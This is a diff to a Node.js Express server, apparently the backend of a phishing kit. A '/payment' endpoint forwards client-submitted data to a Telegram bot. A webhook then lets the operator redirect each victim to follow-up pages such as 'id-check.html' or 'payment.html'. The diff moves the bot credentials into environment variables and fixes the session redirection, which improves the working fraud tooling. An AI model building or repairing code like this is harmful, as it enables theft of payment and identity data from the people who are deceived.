@@ -7,12 +7,16 @@ const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-const BOT_TOKEN = 'TU_BOT_TOKEN';
-const CHAT_ID = 'TU_CHAT_ID';
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+
+let redirectionTable = {};
+let lastSession = null;
 
 // Cliente → Servidor
 app.post('/payment', async (req, res) => {
     const data = req.body;
+    lastSession = data.sessionId;
 
     const text = `
 🟣Viank🟣 - |[info]|
@@ -60,37 +64,18 @@ app.post('/payment', async (req, res) => {
     res.send({ ok: true });
 });
 
-// Telegram → Backend (controla redirección)
-app.post('/redirect', (req, res) => {
-    const { sessionId, target } = req.body;
-    redirectionTable[sessionId] = target;
-    res.send({ ok: true });
-});
-
-// Cliente consulta destino
-let redirectionTable = {};
-app.get('/get-redirect/:sessionId', (req, res) => {
-    const sessionId = req.params.sessionId;
-    const target = redirectionTable[sessionId] || null;
-    res.send({ target });
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
-
+// Webhook que procesa los clics en los botones
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
     const update = req.body;
 
     if (update.callback_query) {
-        const chatId = update.callback_query.message.chat.id;
-        const data = update.callback_query.data; // contiene: go:id-check.html, go:payment.html
-
-        const sessionId = extractSessionId(update.callback_query.message.text); // si decides incluirlo en el texto
+        const data = update.callback_query.data; // ej: "go:id-check.html"
         const target = data.replace('go:', '');
 
-        redirectionTable[sessionId] = target;
+        if (lastSession) {
+            redirectionTable[lastSession] = target;
+        }
 
-        // Notificamos al usuario en Telegram
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: update.callback_query.id,
             text: `Redireccionando al cliente a ${target}`,
@@ -103,3 +88,12 @@ app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
     }
 });
 
+// Cliente consulta redirección
+app.get('/get-redirect/:sessionId', (req, res) => {
+    const sessionId = req.params.sessionId;
+    const target = redirectionTable[sessionId] || null;
+    res.send({ target });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Servidor activo en ${PORT}`));
